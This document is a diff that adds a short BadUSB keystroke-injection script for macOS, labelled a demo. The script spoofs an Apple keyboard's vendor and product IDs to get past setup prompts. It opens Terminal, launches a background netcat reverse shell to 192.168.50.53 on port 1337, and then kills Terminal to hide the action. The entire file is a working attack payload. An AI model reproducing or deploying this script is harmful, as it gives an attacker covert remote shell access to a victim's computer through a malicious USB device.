@@ -1,0 +1,25 @@
+ID 05AC:0250 Apple:Keyboard
+REM You can change these values to VID/PID of original Apple keyboard
+REM to bypass Keyboard Setup Assistant
+
+REM This is BadUSB demo script for macOS
+
+REM Open terminal window
+DELAY 1000
+GUI SPACE
+DELAY 1000
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Start the reverse shell in the background
+STRING nohup nc 192.168.50.53 1337 -e /bin/bash > /dev/null 2>&1 &
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Close the Terminal window by killing its process
+STRING terminal_pid=$(ps aux | grep "Terminal" | grep -v grep | awk '{print $2}') && kill -9 $terminal_pid
+DELAY 1000
+ENTER
